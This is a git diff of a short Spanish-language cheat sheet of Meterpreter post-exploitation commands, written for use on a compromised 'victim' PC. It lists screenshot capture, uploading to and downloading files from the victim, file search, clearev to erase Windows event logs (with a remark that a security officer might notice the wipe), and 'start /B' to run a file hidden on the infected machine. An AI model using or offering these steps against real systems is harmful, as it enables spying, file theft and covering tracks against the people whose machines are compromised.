@@ -1,4 +1,4 @@
-comandos basicos en el meterpreter de msfconsole, una ves conectado a la maquina:
+comandos basicos en el meterpreter de msfconsole y dentro d ela victima , una ves conectado a la maquina:
 
 1. comando para tomar captura de pantalla actual en la maquina victima:
     screenshot
@@ -6,26 +6,36 @@ comandos basicos en el meterpreter de msfconsole, una ves conectado a la maquina
 ejemplo:
     screenshot
 
-comando para subir un archivo desde la maquina atacante hacia la maquina victima:
+2.comando para subir un archivo desde la maquina atacante hacia la maquina victima:
     upload {ruta-completa-con/}[archivo.extension] {ruta-completa-con\\][archivo.extension]
 
 ejemplo
     upload /home/desktop/kevin.txt c:\\users\\lola\\desktop\\kevin.txt
 
-comando para descargar un archivo desde la maquina victima hacia la maquina atacante:
+3.comando para descargar un archivo desde la maquina victima hacia la maquina atacante:
     download {ruta-completa-con\\][archivo.extension] {ruta-completa-con/}[archivo.extension]
 
 ejemplo
     download c:\\users\\lola\\desktop\\kevin.txt /home/desktop/kevin.txt
 
-comando para buscar desde meterpreter la direccion de donde se encuentra un archivo , para confiri mas su existencia o copiar ruta 
-search -f {nombre del archivo ] 
+ 4.comando para buscar desde meterpreter la direccion de donde se encuentra un archivo , para confiri mas su existencia o copiar ruta 
+     search -f {nombre del archivo ] 
 
 EJEMPLO 
 search -f objetivo.txt 
 
-COMANDO PARA BORRAR ACTIVIDAD REALIZADA POR METERPRETER EN LA PC VICTIMA, LO MALO ES QUE EN EVENT VIEW DE WINDOS APARECE QUE EL SYSTEMBORRO LA ACTIVIDAD Y UN ENCARGADO DE CIBERSEGURIDAD SE PUEDE DAR CUENTA DE QUE S EBORRO LA INFORMACION DESDE REMOT O
+5 .COMANDO PARA BORRAR ACTIVIDAD REALIZADA POR METERPRETER EN LA PC VICTIMA, LO MALO ES QUE EN EVENT VIEW DE WINDOS APARECE QUE EL SYSTEMBORRO LA ACTIVIDAD Y UN ENCARGADO DE CIBERSEGURIDAD SE PUEDE DAR CUENTA DE QUE S EBORRO LA INFORMACION DESDE REMOT O
 clearev
 ejemplo
 es solo escribir ese mismo codigo solo tal cual 
+
+===============================================OJO ESTE COMANDO ES DENTRO DE WINDOW D ELA MAKINA INFECTARDA ---------------------------------------
+ 6 .comando para ejecuatr un archivo o documento en segundo plano sin que se abra una pantalla , y solo se puede ver en procesos del administrador de tareas en segundo plano
+start /B {NOMBRE DEL ARCHIVO A EJECUTAR}
+
+EJEMPLO 
+start/B odjetivo.txt
+
+
+
 
